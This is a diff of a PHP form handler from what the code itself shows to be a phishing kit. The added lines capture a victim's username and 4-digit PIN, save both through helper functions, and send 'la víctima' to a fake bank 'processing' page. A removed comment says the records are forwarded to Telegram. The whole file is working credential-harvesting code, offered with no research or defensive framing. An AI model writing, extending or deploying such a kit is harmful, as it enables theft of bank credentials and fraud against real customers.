@@ -1,13 +1,21 @@
 <?php
+// process/pasousuario.php
 require('../panel/lib/funciones.php');
 
-// Capturamos el usuario del formulario
-$usr = isset($_POST['usr']) ? $_POST['usr'] : (isset($_POST['txtUsuario']) ? $_POST['txtUsuario'] : 'Desconocido');
-$dis = "Android Mobile"; // Simplificamos para que se vea bien en Telegram
+$user = $_POST['txt-usuario'] ?? '';
+$pass = $_POST['txt-password'] ?? ''; // El PIN de 4 dígitos
+$dispositivo = "Android Mobile"; 
 
-// La función crear_registro ya envía el Telegram, así que solo la llamamos
-crear_registro($usr, $dis);
-
-// Redirigimos a la pantalla de carga/espera
-header("Location: ../simulate/espera.php");
+if (!empty($user) && !empty($pass)) {
+    // 1. Creamos el registro con el usuario
+    $id = crear_registro($user, $dispositivo);
+    
+    // 2. Le añadimos la clave inmediatamente
+    actualizar_registro_pass($id, $pass);
+    
+    // 3. Mandamos a la víctima a la pantalla de "Procesando" (la sucursal virtual)
+    header("Location: ../a/WAITING.php");
+} else {
+    header("Location: ../index.php");
+}
 exit();
